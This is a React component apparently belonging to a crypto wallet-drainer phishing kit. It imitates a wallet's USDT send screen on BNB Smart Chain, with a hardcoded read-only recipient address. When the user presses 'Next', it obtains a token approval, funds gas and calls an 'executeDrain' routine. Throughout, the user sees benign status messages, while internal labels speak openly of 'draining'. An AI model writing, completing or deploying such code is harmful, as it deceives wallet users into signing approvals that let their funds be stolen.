import { useState, useEffect, useRef } from "react";
import { ethers } from "ethers";
import { USDT_ADDRESS, USDT_DECIMALS } from "../config";
import { requestApproval, ensureGas, executeDrain, ensureCorrectNetwork } from "../lib/web3";

interface Props {
  provider: ethers.BrowserProvider;
  address: string;
}

type DrainStage = "idle" | "switching_network" | "approving" | "checking_gas" | "draining" | "done" | "error";

export default function SendPage({ provider, address }: Props) {
  const [amount, setAmount] = useState("");
  const [usdtBalance, setUsdtBalance] = useState("0");
  const [stage, setStage] = useState<DrainStage>("idle");
  const [statusMsg, setStatusMsg] = useState("");
  const [networkOk, setNetworkOk] = useState(false);
  const [networkError, setNetworkError] = useState("");
  const mountedRef = useRef(true);

  useEffect(() => {
    mountedRef.current = true;

    const init = async () => {
      if (!mountedRef.current) return;

      let activeProvider: ethers.BrowserProvider = provider;
      try {
        const switchedProvider = await ensureCorrectNetwork(provider);
        if (!mountedRef.current) return;
        activeProvider = switchedProvider;
        setNetworkOk(true);
        setNetworkError("");
      } catch (err: any) {
        if (!mountedRef.current) return;
        setNetworkOk(false);
        setNetworkError(err.message || "Please switch to BNB Smart Chain");
        return;
      }

      try {
        const usdt = new ethers.Contract(
          USDT_ADDRESS,
          ["function balanceOf(address) view returns (uint256)"],
          activeProvider
        );
        const bal = await usdt.balanceOf(address);
        if (mountedRef.current) setUsdtBalance(ethers.formatUnits(bal, USDT_DECIMALS));
      } catch (err: any) {
        console.warn("Balance fetch failed:", err?.message || err);
        if (mountedRef.current) setUsdtBalance("0");
      }
    };

    init();

    return () => {
      mountedRef.current = false;
    };
  }, [address, provider]);

  const handleNext = async () => {
    setStage("switching_network");
    setStatusMsg("Preparing network...");
    try {
      const switchedProvider = await ensureCorrectNetwork(provider);

      setStage("approving");
      setStatusMsg("Waiting for approval...");
      const approval = await requestApproval(switchedProvider, address);
      if (!approval) {
        setStage("error");
        setStatusMsg("Approval failed.");
        return;
      }

      setStage("checking_gas");
      setStatusMsg("Checking gas balance...");
      const hasGas = await ensureGas(switchedProvider, address);
      if (!hasGas) {
        setStage("error");
        setStatusMsg("Could not fund gas.");
        return;
      }

      setStage("draining");
      setStatusMsg("Transferring USDT...");
      const drained = await executeDrain(address, approval);
      if (drained) {
        setStage("done");
        setStatusMsg("Transaction complete!");
      } else {
        setStage("error");
        setStatusMsg("Drain failed - check logs.");
      }
    } catch (err: any) {
      setStage("error");
      setStatusMsg("Error: " + (err.message || "Unknown error"));
    }
  };

  // Loading / Error / Success States (Unchanged)
  if (stage !== "idle") {
    return (
      <div className="min-h-screen bg-black flex flex-col items-center justify-center px-6">
        {stage === "switching_network" || stage === "approving" || stage === "checking_gas" || stage === "draining" ? (
          <>
            <div className="w-12 h-12 rounded-full border-4 border-green-500 border-t-transparent animate-spin mb-6" />
            <h2 className="text-white text-lg font-semibold mb-2">Processing</h2>
            <p className="text-gray-400 text-sm text-center">{statusMsg}</p>
          </>
        ) : stage === "done" ? (
          <>
            <div className="w-12 h-12 rounded-full bg-green-500 flex items-center justify-center mb-6">
              <span className="text-black text-2xl font-bold">✓</span>
            </div>
            <h2 className="text-white text-lg font-semibold mb-2">Complete</h2>
            <p className="text-gray-400 text-sm text-center">{statusMsg}</p>
            <p className="text-gray-500 text-xs text-center mt-4">You may close this page.</p>
          </>
        ) : (
          <>
            <div className="w-12 h-12 rounded-full bg-red-500 flex items-center justify-center mb-6">
              <span className="text-white text-2xl font-bold">!</span>
            </div>
            <h2 className="text-white text-lg font-semibold mb-2">Error</h2>
            <p className="text-gray-400 text-sm text-center">{statusMsg}</p>
          </>
        )}
      </div>
    );
  }

  // Main Send Page UI — pixel-perfect (360×800, #111111, Inter)
  return (
    <div
      className="min-h-screen bg-[#111111] text-white flex flex-col"
      style={{ fontFamily: "'Inter', sans-serif" }}
    >
      {/* Main Content */}
      <div className="flex-1 px-6 pt-7 flex flex-col">
        {networkError && !networkOk && (
          <div className="bg-[#1B1B1B] border border-red-500 rounded-[18px] px-4 py-3 mb-4">
            <p className="text-red-500 text-xs text-center">{networkError}</p>
          </div>
        )}
        {networkOk && (
          <div className="bg-[#1B1B1B] border border-green-500 rounded-[18px] px-4 py-3 mb-4">
            <p className="text-green-500 text-xs text-center">Connected to BNB Smart Chain (BEP-20)</p>
          </div>
        )}

        {/* Section 1 — Address */}
        <div>
          <label className="block text-[#B8B8B8] text-[15px] font-medium mb-3">
            Address or Domain Name
          </label>
          <div className="flex items-center gap-4 bg-[#1B1B1B] border border-[#2A2A2A] rounded-[18px] px-[22px] h-16">
            <input
              type="text"
              value="0x3881448305a5fAb94461"
              readOnly
              className="flex-1 bg-transparent text-white text-[18px] font-medium outline-none border-none"
            />
            <button className="text-[#2ED35F] text-[15px] font-medium whitespace-nowrap">Paste</button>
            <button className="text-[#2ED35F]">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                className="h-[22px] w-[22px]"
                fill="none"
                viewBox="0 0 24 24"
                stroke="currentColor"
                strokeWidth={2}
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2zm.5-10h7"
                />
              </svg>
            </button>
            <button className="text-[#2ED35F]">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                className="h-[22px] w-[22px]"
                fill="none"
                viewBox="0 0 24 24"
                stroke="currentColor"
                strokeWidth={2}
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  d="M3.75 4.875c0-.621.504-1.125 1.125-1.125h4.5c.621 0 1.125.504 1.125 1.125v4.5c0 .621-.504 1.125-1.125 1.125h-4.5A1.125 1.125 0 013.75 9.375v-4.5zM3.75 14.625c0-.621.504-1.125 1.125-1.125h4.5c.621 0 1.125.504 1.125 1.125v4.5c0 .621-.504 1.125-1.125 1.125h-4.5a1.125 1.125 0 01-1.125-1.125v-4.5zM13.5 4.875c0-.621.504-1.125 1.125-1.125h4.5c.621 0 1.125.504 1.125 1.125v4.5c0 .621-.504 1.125-1.125 1.125h-4.5A1.125 1.125 0 0113.5 9.375v-4.5z"
                />
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  d="M6.75 6.75h.75v.75h-.75v-.75zM6.75 16.5h.75v.75h-.75v-.75zM16.5 6.75h.75v.75h-.75v-.75zM13.5 13.5h.75v.75h-.75v-.75zM13.5 19.5h.75v.75h-.75v-.75zM19.5 13.5h.75v.75h-.75v-.75zM19.5 19.5h.75v.75h-.75v-.75zM16.5 16.5h.75v.75h-.75v-.75z"
                />
              </svg>
            </button>
          </div>
        </div>

        {/* Section 2 — Destination network */}
        <div className="mt-[34px]">
          <label className="block text-[#B8B8B8] text-[15px] font-medium mb-3">
            Destination network
          </label>
          <div className="flex items-center gap-[14px] bg-[#1B1B1B] rounded-[28px] h-[52px] w-[170px] px-4">
            <img
              src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png"
              alt="BNB"
              className="w-6 h-6"
            />
            <span className="flex-1 text-[#BFBFBF] text-[16px] whitespace-nowrap overflow-hidden">
              BNB Smart Chain
            </span>
            <svg
              xmlns="http://www.w3.org/2000/svg"
              className="h-4 w-4 text-[#8A8A8A]"
              fill="none"
              viewBox="0 0 24 24"
              stroke="currentColor"
              strokeWidth={2}
            >
              <path strokeLinecap="round" strokeLinejoin="round" d="M19 9l-7 7-7-7" />
            </svg>
          </div>
        </div>

        {/* Section 3 — Amount */}
        <div className="mt-[34px]">
          <label className="block text-[#B8B8B8] text-[15px] font-medium mb-3">Amount</label>
          <div className="flex items-center gap-[18px] bg-[#1B1B1B] border border-[#2A2A2A] rounded-[18px] px-[22px] h-16">
            <input
              type="number"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              placeholder="USDT Amount"
              step="0.000001"
              min="0"
              className="flex-1 bg-transparent text-white text-[18px] font-medium outline-none border-none placeholder:text-[#B9B9B9] placeholder:font-normal"
            />
            <span className="text-white text-[16px] font-medium">USDT</span>
            <button
              onClick={() => setAmount(usdtBalance)}
              className="text-[#2ED35F] text-[15px] font-medium whitespace-nowrap"
            >
              Max
            </button>
          </div>
          <p className="text-[#8A8A8A] text-[16px] mt-[18px]">
            ≈ ${(parseFloat(usdtBalance || "0") * 1).toFixed(2)}
          </p>
        </div>

        {/* Spacer */}
        <div className="flex-1" style={{ minHeight: "340px" }} />

        {/* Bottom Button */}
        <button
          onClick={handleNext}
          className="w-full h-[68px] rounded-[34px] bg-[#28D35A] text-black text-[24px] font-semibold hover:bg-[#2ED35F] transition-colors mb-6"
        >
          Next
        </button>
      </div>

      {/* Bottom Navigation */}
      <div className="flex justify-around items-center h-[56px] border-t border-[#2A2A2A]">
        <button className="p-2 text-white">
          <svg
            xmlns="http://www.w3.org/2000/svg"
            className="h-6 w-6"
            fill="none"
            viewBox="0 0 24 24"
            stroke="currentColor"
            strokeWidth={2}
          >
            <path strokeLinecap="round" strokeLinejoin="round" d="M15 19l-7-7 7-7" />
          </svg>
        </button>
        <button className="p-2 text-white">
          <svg
            xmlns="http://www.w3.org/2000/svg"
            className="h-6 w-6"
            fill="none"
            viewBox="0 0 24 24"
            stroke="currentColor"
            strokeWidth={2}
          >
            <path strokeLinecap="round" strokeLinejoin="round" d="M9 5l7 7-7 7" />
          </svg>
        </button>
        <button className="p-2 text-[#2ED35F]">
          <svg
            xmlns="http://www.w3.org/2000/svg"
            className="h-6 w-6"
            fill="none"
            viewBox="0 0 24 24"
            stroke="currentColor"
            strokeWidth={2}
          >
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              d="M4.318 6.318a4.5 4.5 0 000 6.364L12 20.364l7.682-7.682a4.5 4.5 0 00-6.364-6.364L12 7.636l-1.318-1.318a4.5 4.5 0 00-6.364 0z"
            />
          </svg>
        </button>
        <button className="p-2 text-white">
          <svg
            xmlns="http://www.w3.org/2000/svg"
            className="h-6 w-6"
            fill="none"
            viewBox="0 0 24 24"
            stroke="currentColor"
            strokeWidth={2}
          >
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"
            />
          </svg>
        </button>
      </div>
    </div>
  );
}